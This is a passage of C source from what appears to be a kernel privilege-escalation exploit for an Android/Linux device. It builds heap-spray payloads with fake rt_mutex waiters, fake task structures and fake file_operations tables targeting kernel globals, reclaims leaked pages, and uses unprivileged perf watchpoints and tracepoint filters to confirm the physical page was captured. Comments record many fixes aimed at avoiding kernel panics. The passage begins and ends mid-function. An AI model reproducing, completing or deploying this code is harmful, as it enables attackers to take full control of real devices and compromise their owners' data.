      if (n > 0) {
        cur[n] = 0;
        char *nl = strchr(cur, '\n');
        if (nl)
          *nl = 0;
        char *nl2 = strchr(first, '\n');
        if (nl2)
          *nl2 = 0;
        if (first[0] && strcmp(first, cur) == 0) {
          memset(line, 0, cap);
          if (fgets(line, (int)cap, df) &&
              line[0] == '0' && (line[1] == 'x' || line[1] == 'X'))
            ok = 1;
          else
            pr_warning("skbdelta missing payload line after boot_id\n");
        } else {
          pr_warning("skbdelta boot_id mismatch file=%s cur=%s; discard\n",
                     first, cur);
        }
      } else {
        pr_warning("skbdelta cannot read current boot_id; discard\n");
      }
    }
  }
  fclose(df);
  return ok;
}

/* Write the skbdelta file in the new boot_id+payload format. */
static void skbdelta_write_payload(uintptr_t payload_base) {
  FILE *wf = fopen(pb_file_path(), "w");
  if (!wf && errno == EACCES) {
    /* A root child from a previous run/boot created it root:644; our
     * dir is 777 so unlink always works, then recreate shell-owned. */
    unlink(pb_file_path());
    wf = fopen(pb_file_path(), "w");
  }
  if (!wf) {
    pr_warning("skbdelta write failed errno=%d (stale file will fail "
               "reload)\n", errno);
    return;
  }
  char bid[80];
  memset(bid, 0, sizeof(bid));
  int bfd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  ssize_t bn = bfd >= 0 ? read(bfd, bid, sizeof(bid) - 1) : -1;
  if (bfd >= 0)
    close(bfd);
  if (bn > 0) {
    bid[bn] = 0;
    fputs(bid, wf);
    if (bid[bn - 1] != '\n')
      fputc('\n', wf);
  }
  fprintf(wf, "0x%016llx\n", (unsigned long long)payload_base);
  fclose(wf);
  pr_info("skbdelta wrote pb=%016llx path=%s\n",
          (unsigned long long)payload_base, pb_file_path());
}

int prepare_skb_payload(uintptr_t base, int payload_mode) {
  memset(skb_buf, 0, SKB_SEND_SIZE);

  long long payload_delta = SKB_DATA_DELTA;
  /*
   * fix44: deterministic mode (send_size=0x8000, fresh pthread, offset=0)
   * means the payload starts at page+0, not page+SKB_DATA_DELTA.  The
   * fake fops table is at skb_buf+FOPS_TABLE_OFF = page+0x1000, so
   * payload_base must equal base (delta=0).  Using SKB_DATA_DELTA here
   * made fake_fops = base+0x180 (wrong) and the route wrote a garbage
   * pointer into ASHMEM_MISC_FOPS -> panic on open.
   */
  if (env_on("KS_RECLAIM_DETERMINISTIC"))
    payload_delta = 0;
  const char *delta_env = getenv("KS_SKB_DATA_DELTA");
  if (delta_env && delta_env[0]) {
    long long v = strtoll(delta_env, NULL, 0);
    if (v >= -0x100000000LL && v <= 0x100000000LL) {
      payload_delta = v;
    } else {
      pr_warning("KS_SKB_DATA_DELTA out of range, keep %lld\n",
                 (long long)SKB_DATA_DELTA);
    }
  }
  {
    const char *dfe = getenv("KS_SKB_DELTA_FILE");
    if (dfe && dfe[0] && strcmp(dfe, "0") != 0 && strcasecmp(dfe, "false") != 0 &&
        strcasecmp(dfe, "no") != 0) {
      char line[80];
      memset(line, 0, sizeof(line));
      if (skbdelta_read_line(line, sizeof(line))) {
        if (line[0] == '0' && (line[1] == 'x' || line[1] == 'X')) {
          unsigned long long abs_pb = strtoull(line, NULL, 16);
          if (abs_pb >= 0xffffff8000000000ULL &&
              abs_pb < 0xffffffc000000000ULL) {
            payload_delta = (long long)((long long)abs_pb - (long long)base);
            pr_info("skb abs file payload_base=0x%llx delta=%lld\n", abs_pb,
                    payload_delta);
          } else {
            pr_warning("skb abs file out of range %llx\n", abs_pb);
          }
        } else {
          long long v = strtoll(line, NULL, 10);
          if (v >= -0x100000000LL && v <= 0x100000000LL) {
            payload_delta = v;
            pr_info("skb delta file override %lld\n", v);
          }
        }
      }
    }
  }
  uintptr_t payload_base = (uintptr_t)((long long)base + payload_delta);
  skb_payload_base = payload_base;
  pr_info("prepare_skb_payload base=%016zx delta=%lld payload_base=%016zx\n",
          base, payload_delta, payload_base);
  skbdelta_write_payload(payload_base);

  fake_lock = payload_base + LOCK_OFF;
  fake_w0 = payload_base + W0_OFF;
  fake_task = payload_base + FAKE_TASK_OFF;
  fake_fops = payload_base + FOPS_TABLE_OFF;
  if (payload_mode == PAGE_PAYLOAD_FOPS) {
    fake_parent = fake_fops;
    fake_right = text_addr(ASHMEM_MISC_FOPS);
    fake_left = 0;
    binwrite_target = payload_base + SCRATCH_OFF;
  } else {
    fake_parent = text_addr(ASHMEM_MISC_FOPS) - 8;
    fake_right = fake_fops;
    fake_left = payload_base + LEFT_OFF;
    binwrite_target = payload_base + FOPS_OFF + 0x700;
  }

  uintptr_t write_pc = fake_fops;
  uintptr_t write_right = text_addr(ASHMEM_MISC_FOPS);
  uintptr_t write_left = 0;
  uint64_t waiter_task = text_addr(INIT_TASK);
  uint64_t task_group = text_addr(ROOT_TASK_GROUP);
  uint64_t pi_top_task = text_addr(INIT_TASK);
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    write_pc = SLIDE_LOGGERS_0_1;
    write_right = 0;
    write_left = SLIDE_RANDOM_BOOT_ID_DATA;
    waiter_task = SLIDE_INIT_TASK;
    task_group = SLIDE_ROOT_TASK_GROUP;
    pi_top_task = SLIDE_INIT_TASK;
  }

  for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
    unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;

    put32(p, LOCK_OFF + 0x00, 0);
    if (pselect_payload_lock) {
      /*
       * rt_mutex must read back entirely zero: wait_lock (+0x00),
       * waiters.rb_node (+0x08), waiters.rb_leftmost (+0x10) and owner
       * (+0x18).  A non-zero rb_leftmost puts the very first attempt down
       * the rb_next() arm that ends in the rtmutex_common.h BUG.
       */
      put64(p, LOCK_OFF + 0x08, 0);
      put64(p, LOCK_OFF + 0x10, 0);
      put64(p, LOCK_OFF + 0x18, 0);
      memset(p + PSELECT_TASK_PROBE_OFF, 0, PSELECT_TASK_PROBE_SIZE);
    } else if (payload_mode == PAGE_PAYLOAD_SLIDE) {
      put64(p, LOCK_OFF + 0x08, 0);
      put64(p, LOCK_OFF + 0x10, 0);
      put64(p, LOCK_OFF + 0x18, 0);
    } else {
      put64(p, LOCK_OFF + 0x08, fake_w0);
      put64(p, LOCK_OFF + 0x10, fake_w0);
      put64(p, LOCK_OFF + 0x18, fake_task | 1);
    }

    put64(p, W0_OFF + 0x00, 1);
    put64(p, W0_OFF + 0x08, 0);
    put64(p, W0_OFF + 0x10, 0);
    put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
    put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
    put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
    put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
    put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
    put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
    put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);

    put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
    if (payload_mode == PAGE_PAYLOAD_FOPS) {
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
    } else {
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
    }
    put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);

    put64(p, RIGHT_OFF + 0x00, fake_parent);
    put64(p, RIGHT_OFF + 0x08, 0);
    put64(p, RIGHT_OFF + 0x10, 0);

    put64(p, LEFT_OFF + 0x00, fake_parent);
    put64(p, LEFT_OFF + 0x08, 0);
    put64(p, LEFT_OFF + 0x10, 0);

    if (payload_mode == PAGE_PAYLOAD_FOPS) {
      /*
       * The 0x10000 send splits into two skbs (unix_stream_sendmsg:
       * size capped at SKB_MAX_HEAD(0)+UNIX_SKB_FRAGS_SZ = 0x8e80):
       *   skb1: head [0,0xe80) + one order-3 frag [0xe80,0x8e80)
       *   skb2: head [0x8e80,0x9000) + order-2/1/0 frags [0x9000,0x10000)
       * fake_fops = payload_base+0x1000 = leaked_mm_page+0x180, so the
       * fill only lands on it when one of those allocations reuses the
       * leaked page (or its neighbour), and the exact X depends on which
       * one wins the freelist race.  Candidate offsets: 0x180 (head1 at
       * base), 0x1000 (frag1 = base), 0x9000 (frag1 = base-0x8000),
       * 0x9180/0xd180/0xf180 (skb2 frags at base).  Lay a table every
       * 0x80 bytes so every 0x80-aligned candidate carries a valid
       * table: ascending writes leave each table's first 0x80 bytes
       * (owner..flush, incl. read/write/ioctl/mmap/open) intact, and the
       * clobbered slots >= 0x80 (release/splice/fdinfo) are unused by
       * the CFI stage.  The BSS-lock route never dereferences the
       * lock/w0/task scratch, so the overlap there is harmless.
       */
      for (size_t fo = 0; fo + 0x80 <= ORDER3_SIZE; fo += 0x80) {
        put_fake_fops_table(p, fo);
      }
    }
  }

  if (payload_mode == PAGE_PAYLOAD_FOPS) {
    /*
     * Planted AFTER the table loop so nothing clobbers it.  Under the
     * candidate mappings from the comment above (table lands at
     * buffer offset C for base+0x180), buffer[C+0x100] lands at
     * base+0x280 -- inside object0 but past every fops slot the CFI
     * stage or a third-party file op can reach (table ends +0x268).
     * Six writes cover all six candidates; only the true mapping
     * shows up at base+0x280, the others fall into other skb bytes.
     */
    struct timespec nt;
    clock_gettime(CLOCK_REALTIME, &nt);
    payload_nonce = ((uint64_t)nt.tv_nsec << 32) ^ (uint64_t)nt.tv_sec ^
                    ((uint64_t)getpid() << 40) ^ 0x5a5a5a5aULL;
    if (!payload_nonce)
      payload_nonce = 0x9e3779b97f4a7c15ULL;
    static const size_t nonce_offs[] = {0x280,  0x1100, 0x9100,
                                        0x9280, 0xd280, 0xf280};
    for (size_t i = 0; i < sizeof(nonce_offs) / sizeof(nonce_offs[0]); i++)
      put64(skb_buf + nonce_offs[i], 0, payload_nonce);
    pr_info("payload nonce %llx at %zx %zx %zx %zx %zx %zx\n",
            (unsigned long long)payload_nonce, nonce_offs[0], nonce_offs[1],
            nonce_offs[2], nonce_offs[3], nonce_offs[4], nonce_offs[5]);
  }
  return 1;
}

/* Re-derive the payload-relative globals from /data/local/temp/skbdelta.
 * Called right before a real pselect attempt so the globals point at the
 * *current* reclaim queue instead of whatever a previous prepare latched. */
int reload_payload_base(void) {
  char line[80];
  memset(line, 0, sizeof(line));
  if (!skbdelta_read_line(line, sizeof(line))) return 0;
  if (!(line[0] == '0' && (line[1] == 'x' || line[1] == 'X'))) return 0;
  unsigned long long abs_pb = strtoull(line, NULL, 16);
  if (abs_pb < 0xffffff8000000000ULL || abs_pb >= 0xffffffc000000000ULL) {
    pr_warning("reload payload base out of range %llx\n", abs_pb);
    return 0;
  }
  /* The generic range above spans several boots' physmaps: a skbdelta
   * left by a previous boot (root-owned, shell could not overwrite)
   * passed it and sent the route's pselect at a stale address -> panic.
   * Require membership in THIS boot's direct map. */
  if (abs_pb < ks_p0_page_offset ||
      abs_pb >= ks_p0_page_offset + (unsigned long long)KS_RAM_SPAN) {
    pr_warning("reload payload base %llx outside current physmap "
               "[%llx,%llx); stale skbdelta from another boot?\n",
               abs_pb, (unsigned long long)ks_p0_page_offset,
               (unsigned long long)(ks_p0_page_offset + KS_RAM_SPAN));
    return 0;
  }
  uintptr_t payload_base = (uintptr_t)abs_pb;
  /* Prefer the live globals: they were written by THIS run's successful
   * prepare (skb_payload_base set, window-checked).  The file can hold a
   * stale value from an earlier attempt or process on the same boot
   * (observed: prepare wrote 0xffffffa49a3ef180, the route's reload
   * swapped in 0xffffffa4a2e7f180 from the file, the fops pointer then
   * targeted a garbage page and the landed route jumped through it ->
   * kernel_panic).  Only adopt the file value when the globals are
   * unset (fresh context that never ran prepare_skb_payload). */
  if (skb_payload_base != 0 && payload_base != skb_payload_base) {
    pr_warning("reload payload base file=%016zx live=%016zx mismatch; "
               "keeping live globals (stale file?)\n",
               payload_base, skb_payload_base);
    return 1;
  }
  if (skb_payload_base != 0)
    return 1;
  fake_lock = payload_base + LOCK_OFF;
  fake_w0 = payload_base + W0_OFF;
  fake_task = payload_base + FAKE_TASK_OFF;
  fake_fops = payload_base + FOPS_TABLE_OFF;
  fake_parent = fake_fops;
  fake_right = text_addr(ASHMEM_MISC_FOPS);
  fake_left = 0;
  binwrite_target = payload_base + SCRATCH_OFF;
  pr_info("reload payload base from file pb=%016zx lock=%016zx fops=%016zx\n",
          payload_base, fake_lock, fake_fops);
  /* Global-only refresh: the bss-lock/simple-layout route consumes only these
   * globals (value=fake_fops goes into the stack fdset words) plus the fops
   * table slots, and every slot misc_open/pwrite touch is a payload-independent
   * text address, so the queued content needs no restage.  The old in-place
   * rebase (configfs writes) could never work before the route itself hands us
   * a working write primitive, and running it with stale content is what
   * corrupted the chain and panicked the kernel. */
  return 1;
}

static void shrink_mm_slab(const char *why) {
  const char *se = getenv("KS_MM_SHRINK");
  int shrink_on = !se || !se[0] ||
                  (strcmp(se, "0") != 0 && strcasecmp(se, "false") != 0 &&
                   strcasecmp(se, "no") != 0);
  if (!shrink_on)
    return;
  /* Through ks_write_file: shell cannot open slab shrink (root 600), and
   * without a shrink the mm_struct page often never reaches buddy on a
   * fresh boot -> reclaim capture fails every attempt.  The
   * KS_TRACEFS_SUDO fallback covers it. */
  if (ks_write_file("/sys/kernel/slab/mm_struct/shrink", "1\n") == 0) {
    pr_info("slub shrink mm_struct(%s) ok\n", why);
  } else {
    pr_warning("slub shrink(%s) failed errno=%d\n", why, errno);
  }
}

/* Parse the mm_struct row of /proc/slabinfo (world-readable on this
 * device).  Row format:
 *   mm_struct <active_objs> <num_objs> <objsize> <objperslab>
 *             <pagesperslab> : tunables ... : slabdata
 *             <active_slabs> <num_slabs> ...
 * Returns 0 and fills *num_slabs / *active_objs, -1 on any failure. */
static int read_mm_slab_row(long *num_slabs, long *active_objs) {
  FILE *f = fopen("/proc/slabinfo", "r");
  if (!f)
    return -1;
  char line[320];
  int rc = -1;
  while (fgets(line, sizeof(line), f)) {
    if (strncmp(line, "mm_struct ", 10) != 0)
      continue;
    long ao = 0, no = 0, as = 0, ns = 0;
    int got = sscanf(line,
                     "mm_struct %ld %ld %*d %*d %*d : %*s %*ld %*ld %*ld "
                     ": %*s %ld %ld",
                     &ao, &no, &as, &ns);
    if (got >= 4) {
      *active_objs = ao;
      *num_slabs = ns;
      rc = 0;
    }
    break;
  }
  fclose(f);
  return rc;
}

/*
 * fix35: hardware write watchpoint (perf PERF_TYPE_BREAKPOINT +
 * HW_BREAKPOINT_W) as a payload-capture oracle.  perf_event_paranoid=-1
 * on this device allows unprivileged kernel watchpoints.  We count
 * EL1 writes to two payload slots during the phase-2 send window:
 *   nonce slot = payload_base + FOPS_OFF + 0x100  (base+0x280)
 *   open slot  = payload_base + FOPS_OFF + FOPS_OPEN_OFF (base+0x1f0)
 * plus a sentinel slot at base+0x7f00 (frag-only region: buffer offset
 * 0x8d80, beyond any kmalloc-8k head capture) so a head-of-page capture
 * by a competing kmalloc-8k skb cannot fake a full-table hit.
 * counting mode (sample_period=0): read(fd) returns the hit count.
 */
static int wp_open_watch(uintptr_t addr, const char *tag) {
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_BREAKPOINT;
  pe.size = sizeof(pe);
  pe.bp_type = HW_BREAKPOINT_W;
  pe.bp_addr = (uint64_t)addr;
  pe.bp_len = HW_BREAKPOINT_LEN_8;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  pe.disabled = 1;
  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) {
    pr_warning("watchpoint %s open addr=%016zx errno=%d\n", tag, addr, errno);
    return -1;
  }
  pr_info("watchpoint %s armed addr=%016zx fd=%d\n", tag, addr, fd);
  return fd;
}

static void wp_arm(int fd) {
  if (fd < 0) return;
  ioctl(fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
}

static long long wp_hits(int fd, const char *tag) {
  if (fd < 0) return -1;
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  uint64_t cnt = 0;
  ssize_t r = read(fd, &cnt, sizeof(cnt));
  if (r != (ssize_t)sizeof(cnt)) {
    pr_warning("watchpoint %s read rv=%zd errno=%d\n", tag, r, errno);
    return -1;
  }
  return (long long)cnt;
}

/*
 * fix36: Tier-0 capture oracle via perf tracepoint counting + SET_FILTER.
 *
 * At Tier-0 every content-read primitive is dead (kprobe tracefs denied,
 * watchpoints EINVAL/EPERM, configfs reads EBADF, PERF_SAMPLE_RAW EACCES),
 * so the payload gate could never prove the victim order-3 page was
 * captured and discarded every attempt (fix35: capture=0, rv=-1).
 * What DOES work unprivileged: perf_event_open on a tracepoint in
 * counting mode (pid=0, exclude=kernel events for our task) plus
 * PERF_EVENT_IOC_SET_FILTER with a pfn match -- neither touches tracefs.
 * Arming a "mm_page_alloc filtered to the victim page's pfn" counter
 * across our send windows and reading >0 afterwards proves OUR task
 * allocated that exact page while sending (kmalloc head growth, unix
 * order-0 frags and TCP order-3 frags all fire mm_page_alloc in the
 * sender's context), i.e. the payload bytes landed there.  Only
 * subpage0 (pfn == base_pfn) matters: fake_fops/base+0x180 and the nonce
 * at base+0x280 both live there, so an exact-pfn hit is necessary for
 * every candidate mapping and cannot pass on a partial (order-0)
 * capture of the wrong subpage.
 */
static int ks_tp_open(uint64_t id) {
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_TRACEPOINT;
  pe.size = sizeof(pe);
  pe.config = id;
  pe.disabled = 1;
  pe.exclude_hv = 1;
  return (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
}

/* Discover this boot's mm_page_alloc tracepoint id (ids are assigned at
 * boot, never hardcode): the only event carrying BOTH an order/pfn pair
 * and a gfp_flags field (mm_page_free/extfrag/rss_stat/kmalloc each miss
 * at least one of the two probes).  Cached for the process lifetime. */
static int ks_tp_alloc_id(void) {
  static int cached;
  if (cached) return cached;
  cached = -1;
  for (uint64_t id = 1; id < 4096; id++) {
    int fd = ks_tp_open(id);
    if (fd < 0) continue;
    int has_pfn_order =
        ioctl(fd, PERF_EVENT_IOC_SET_FILTER, "pfn == 12345 && order == 3") == 0;
    close(fd);
    if (!has_pfn_order) continue;
    fd = ks_tp_open(id);
    if (fd < 0) continue;
    int has_gfp = ioctl(fd, PERF_EVENT_IOC_SET_FILTER, "gfp_flags == 0") == 0;
    close(fd);
    if (has_gfp) {
      cached = (int)id;
      pr_info("fix36 mm_page_alloc tracepoint id=%d\n", cached);
      return cached;
    }
  }
  pr_warning("fix36 mm_page_alloc tracepoint not found\n");
  return cached;
}

/* Arm a pfn-filtered alloc counter for the leaked order-3 page.  One
 * filter per fd (kernel rejects a second with EEXIST), so each window
 * opens fresh fds.  Returns fd, or -1 when the oracle is unavailable
 * (gate then falls back to pass=0 exactly like fix35). */
#define TP_CANDS_MAX 16
/* Discover this boot's mm_page_free tracepoint id (fix40): pfn+order
 * filterable, NO gfp_flags field (that's mm_page_alloc), and no
 * fallback_order field (that's mm_page_free_extfrag, which fires on
 * buddy splits rather than frees).  Counting a pfn-filtered order-3
 * free of the victim page pins its true pfn -- and hence the true
 * direct-map base k -- before the capture spray runs. */
static int ks_tp_free_id(void) {
  static int cached;
  if (cached) return cached;
  cached = -1;
  for (uint64_t id = 1; id < 4096; id++) {
    int fd = ks_tp_open(id);
    if (fd < 0) continue;
    int has_pfn_order =
        ioctl(fd, PERF_EVENT_IOC_SET_FILTER, "pfn == 12345 && order == 3") == 0;
    close(fd);
    if (!has_pfn_order) continue;
    fd = ks_tp_open(id);
    if (fd < 0) continue;
    int has_gfp = ioctl(fd, PERF_EVENT_IOC_SET_FILTER, "gfp_flags == 0") == 0;
    close(fd);
    if (has_gfp) continue;
    fd = ks_tp_open(id);
    if (fd < 0) continue;
    int has_extfrag =
        ioctl(fd, PERF_EVENT_IOC_SET_FILTER, "fallback_order == 0") == 0;
    close(fd);
    if (has_extfrag) continue;
    cached = (int)id;
    pr_info("fix40 mm_page_free tracepoint id=%d\n", cached);
    return cached;
  }
  pr_warning("fix40 mm_page_free tracepoint not found\n");
  return cached;
}

/* Shared candidate-pfn grid: phys_est = base - la0, true pfn =
 * est + k*0x40000 for k in [kmin,kmax]. */
static int ks_tp_cands(uintptr_t base, unsigned long *pfns, int *ks,
                       int *kmin_out, int *kmax_out,
                       unsigned long *est_pfn_out) {
  if (!base || !ks_direct_map_base || base < ks_direct_map_base ||
      base >= ks_direct_map_end)
    return 0;
  uint64_t phys_est = base - ks_direct_map_base;
  int kmin = -2;
  while (kmin < 0 && phys_est < (uint64_t)(-kmin) * KS_GIB + P0_PHYS_OFFSET)
    kmin++;
  int kmax = (int)((KS_RAM_SPAN - phys_est - 1) / KS_GIB);
  if (kmax > TP_CANDS_MAX - 3)
    kmax = TP_CANDS_MAX - 3;
  int n = 0;
  for (int k = kmin; k <= kmax; k++) {
    uint64_t phys =
        (uint64_t)((int64_t)phys_est + (int64_t)k * (int64_t)KS_GIB);
    if (phys < P0_PHYS_OFFSET || phys >= KS_RAM_SPAN)
      continue;
    pfns[n] = (unsigned long)(phys >> 12);
    if (ks) ks[n] = k;
    n++;
  }
  if (kmin_out) *kmin_out = kmin;
  if (kmax_out) *kmax_out = kmax;
  if (est_pfn_out) *est_pfn_out = (unsigned long)(phys_est >> 12);
  return n;
}

/* fix40: pfn-filtered mm_page_free counters armed across the victim
 * discard window.  Exactly one candidate pfn firing an order-3 free
 * pins k_true; zero means the free ran outside our task context (safe
 * abort), more than one means coincidence contamination (safe abort). */
struct tp_free_win {
  int fd[TP_CANDS_MAX];
  unsigned long pfn[TP_CANDS_MAX];
  int k[TP_CANDS_MAX];
  long long hits[TP_CANDS_MAX];
  int n;
};

static void ks_free_arm_win(struct tp_free_win *w, uintptr_t base) {
  memset(w, 0, sizeof(*w));
  for (int i = 0; i < TP_CANDS_MAX; i++) w->fd[i] = -1;
  int id = ks_tp_free_id();
  if (id <= 0) return;
  unsigned long pfns[TP_CANDS_MAX];
  int ks[TP_CANDS_MAX], kmin, kmax;
  unsigned long est;
  int nc = ks_tp_cands(base, pfns, ks, &kmin, &kmax, &est);
  for (int i = 0; i < nc && w->n < TP_CANDS_MAX; i++) {
    int fd = ks_tp_open((uint64_t)id);
    if (fd < 0) break;
    char filt[64];
    snprintf(filt, sizeof(filt), "pfn == %lu && order == 3", pfns[i]);
    if (ioctl(fd, PERF_EVENT_IOC_SET_FILTER, filt) < 0) {
      close(fd);
      continue;
    }
    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    w->pfn[w->n] = pfns[i];
    w->k[w->n] = ks[i];
    w->fd[w->n] = fd;
    w->n++;
  }
  pr_info("fix40 free-arm n=%d est_pfn=%lu k=[%d,%d]\n", w->n, est, kmin,
          kmax);
}

static int ks_free_read_win(struct tp_free_win *w, int *k_out) {
  int nhit = 0;
  if (k_out) *k_out = -1;
  for (int i = 0; i < w->n; i++) {
    w->hits[i] = -1;
    if (w->fd[i] >= 0) {
      ioctl(w->fd[i], PERF_EVENT_IOC_DISABLE, 0);
      uint64_t cnt = 0;
      if (read(w->fd[i], &cnt, 8) == 8) w->hits[i] = (long long)cnt;
      close(w->fd[i]);
      w->fd[i] = -1;
      if (w->hits[i] > 0) {
        nhit++;
        if (k_out && *k_out < 0) *k_out = w->k[i];
        pr_info("fix40 free HIT pfn=%lu k=%d hits=%lld\n", w->pfn[i], w->k[i],
                w->hits[i]);
      }
    }
  }
  return nhit;
}

struct tp_win {
  int cand_fd[TP_CANDS_MAX];
  unsigned long cand_pfn[TP_CANDS_MAX];
  long long cand_hits[TP_CANDS_MAX];
  int cand_fd3[TP_CANDS_MAX];
  long long cand_hits3[TP_CANDS_MAX];
  int n;
  int ctrl_fd;
  long long ctrl_hits;
  int ord3_fd; /* fix38: total order-3 counter for the window */
  long long ord3_hits;
  unsigned long est_pfn;
};

/* fix40: k_fixed >= 0 arms only that candidate k (after ks_free_arm_win
 * pinned the victim's true pfn via its order-3 discard); k_fixed < 0
 * arms the full grid (pre-pin / diagnostic use). */
static void ks_tp_arm_win(struct tp_win *w, uintptr_t base, int k_fixed) {
  memset(w, 0, sizeof(*w));
  for (int i = 0; i < TP_CANDS_MAX; i++) {
    w->cand_fd[i] = -1;
    w->cand_fd3[i] = -1;
  }
  w->ctrl_fd = -1;
  w->ctrl_hits = -1;
  w->ord3_fd = -1;
  w->ord3_hits = -1;
  int id = ks_tp_alloc_id();
  if (id <= 0) return;
  if (!base || !ks_direct_map_base || base < ks_direct_map_base ||
      base >= ks_direct_map_end) {
    pr_warning("fix36 tp arm: base=%p outside direct map %p..%p\n",
               (void *)base, (void *)ks_direct_map_base,
               (void *)ks_direct_map_end);
    return;
  }
  /* control counter: every page alloc in our own task context (no pfn
   * match) -- separates "counting is broken" from "pfn never hit". */
  int cfd = ks_tp_open((uint64_t)id);
  if (cfd >= 0) {
    if (ioctl(cfd, PERF_EVENT_IOC_SET_FILTER, "order <= 10") == 0) {
      ioctl(cfd, PERF_EVENT_IOC_RESET, 0);
      ioctl(cfd, PERF_EVENT_IOC_ENABLE, 0);
      w->ctrl_fd = cfd;
    } else {
      close(cfd);
    }
  }
  /* fix38: total order-3 counter (no pfn match) -- tells whether the
   * page-frag refill used order-3 at all and where in the order-3
   * sequence a candidate hit falls. */
  int ofd = ks_tp_open((uint64_t)id);
  if (ofd >= 0) {
    if (ioctl(ofd, PERF_EVENT_IOC_SET_FILTER, "order == 3") == 0) {
      ioctl(ofd, PERF_EVENT_IOC_RESET, 0);
      ioctl(ofd, PERF_EVENT_IOC_ENABLE, 0);
      w->ord3_fd = ofd;
    } else {
      close(ofd);
    }
  }
  /*
   * ks_layout_infer_from_leak's la0 = align1G(base) - 2GiB is exact only
   * when base's RAM offset r < 1GiB; in general the true PAGE_OFFSET is
   * la0 - floor(r/1GiB)*1GiB (arm64 memory KASLR is PUD/1GiB-aligned),
   * so the true pfn is est + k*0x40000.  Arm one counter per candidate
   * k in [kmin, kmax]: a hit both proves the capture and reveals the
   * true direct-map base for this boot.  k<0 covers the (analysis-
   * excluded) case of PAGE_OFFSET above la0 while phys stays in RAM.
   */
  uint64_t phys_est = base - ks_direct_map_base;
  int kmin = -2;
  while (kmin < 0 && phys_est < (uint64_t)(-kmin) * KS_GIB + P0_PHYS_OFFSET)
    kmin++;
  int kmax = (int)((KS_RAM_SPAN - phys_est - 1) / KS_GIB);
  if (kmax > TP_CANDS_MAX - 3)
    kmax = TP_CANDS_MAX - 3;
  w->est_pfn = (unsigned long)(phys_est >> 12);
  for (int k = kmin; k <= kmax && w->n < TP_CANDS_MAX; k++) {
    if (k_fixed >= 0 && k != k_fixed) continue;
    uint64_t phys = (uint64_t)((int64_t)phys_est + (int64_t)k * (int64_t)KS_GIB);
    if (phys < P0_PHYS_OFFSET || phys >= KS_RAM_SPAN)
      continue;
    unsigned long pfn = (unsigned long)(phys >> 12);
    int fd = ks_tp_open((uint64_t)id);
    if (fd < 0)
      break;
    char filt[64];
    snprintf(filt, sizeof(filt), "pfn == %lu", pfn);
    if (ioctl(fd, PERF_EVENT_IOC_SET_FILTER, filt) < 0) {
      pr_warning("fix36 tp filter '%s' errno=%d\n", filt, errno);
      close(fd);
      continue;
    }
    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    w->cand_pfn[w->n] = pfn;
    w->cand_fd[w->n] = fd;
    /*
     * fix37: a second counter on the same pfn but order==3 only.  TCP
     * page-frag capture allocates the victim as an order-3 page, while
     * the incidental grabs that caused the fix36 false pass (skbuff/
     * kmalloc slab growth during sendmsg) are order-0/1.  The gate
     * credits only order-3 hits.
     */
    char filt3[96];
    snprintf(filt3, sizeof(filt3), "pfn == %lu && order == 3", pfn);
    int fd3 = ks_tp_open((uint64_t)id);
    if (fd3 >= 0) {
      if (ioctl(fd3, PERF_EVENT_IOC_SET_FILTER, filt3) == 0) {
        ioctl(fd3, PERF_EVENT_IOC_RESET, 0);
        ioctl(fd3, PERF_EVENT_IOC_ENABLE, 0);
        w->cand_fd3[w->n] = fd3;
      } else {
        close(fd3);
      }
    }
    w->n++;
  }
  pr_info("fix36 tp arm n=%d ctrl=%d est_pfn=%lu k=[%d,%d] k_fixed=%d\n",
